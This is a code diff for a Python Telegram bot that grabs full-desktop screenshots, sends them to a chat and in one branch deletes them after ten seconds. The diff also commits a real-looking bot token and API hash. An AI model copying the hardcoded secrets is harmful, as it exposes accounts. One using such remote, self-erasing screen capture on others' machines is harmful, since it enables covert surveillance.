@@ -12,7 +12,7 @@ ss_running = False
 
 api_id = 706263
 api_hash = '8dd3aa475c6c1ca8d82f0b9cdc4ad6c3'
-BOT_TOKEN = 'YOUR_BOT_TOKEN'
+BOT_TOKEN = '6650813114:AAE9tPYGvu0ult91gqNJ00ZKx4kAj9qlZT8'
 client = TelegramClient('bot_session', api_id, api_hash).start(bot_token=BOT_TOKEN)
 from PIL import Image
 import io
@@ -61,35 +61,35 @@ async def run_script_and_send_screenshot(chat_id, script_filename):
     except Exception as e:
         print(f"Error: {str(e)}")
 
+from PIL import ImageGrab
+
 async def capture_and_send_screenshot(chat_id, if_single=False):
     if if_single:
-        with mss.mss() as sct:
-            screenshot = sct.shot(output="screenshot.png")
-        with open("screenshot.png", "rb") as file:
-            img_byte_array = io.BytesIO(file.read())
+        # Capture a single screenshot of the entire desktop
+        screenshot = ImageGrab.grab()
+        img_byte_array = io.BytesIO()
+        screenshot.save(img_byte_array, format="PNG")
+        img_byte_array.seek(0)
+
         message = await client.send_file(chat_id, img_byte_array, caption="Screenshot")
-        os.remove("screenshot.png")
-        await asyncio.sleep(10)
-        await client.delete_messages(chat_id, [message])
     else:
         pyautogui.press("F11")
         global scripts_running
         scripts_running = True
 
         try:
-            with mss.mss() as sct:
-                screenshot = sct.shot(output="screenshot.png")
-            with open("screenshot.png", "rb") as file:
-                img_byte_array = io.BytesIO(file.read())
-            message = await client.send_file(chat_id, img_byte_array, caption="Screenshot")
+            # Capture a screenshot of the entire desktop
+            screenshot = ImageGrab.grab()
+            img_byte_array = io.BytesIO()
+            screenshot.save(img_byte_array, format="PNG")
+            img_byte_array.seek(0)
 
-            os.remove("screenshot.png")
+            message = await client.send_file(chat_id, img_byte_array, caption="Screenshot")
 
             await asyncio.sleep(10)
             await client.delete_messages(chat_id, [message])
         except Exception as e:
             print(f"Error: {str(e)}")
-
 @client.on(events.NewMessage)
 async def handle_message(event):
     global ss_running
